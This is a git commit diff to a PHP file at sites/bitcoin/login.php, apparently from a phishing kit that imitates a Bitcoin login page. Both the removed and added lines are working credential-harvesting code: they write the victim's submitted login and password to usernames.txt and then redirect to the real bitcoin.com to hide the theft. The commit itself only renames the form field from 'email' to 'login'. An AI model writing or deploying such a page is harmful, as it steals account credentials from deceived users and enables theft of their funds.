a51c0d550a82be3bf7dce9b67d28a8b4da4d2d79
techblender <75220515+techblender@users.noreply.github.com>
2020-12-15 00:52:11 +0500

    Update login.php

--- sites/bitcoin/login.php
+++ sites/bitcoin/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Account: " . $_POST['email'] . "\nPass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Account: " . $_POST['login'] . "\nPass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://www.bitcoin.com');
 exit();
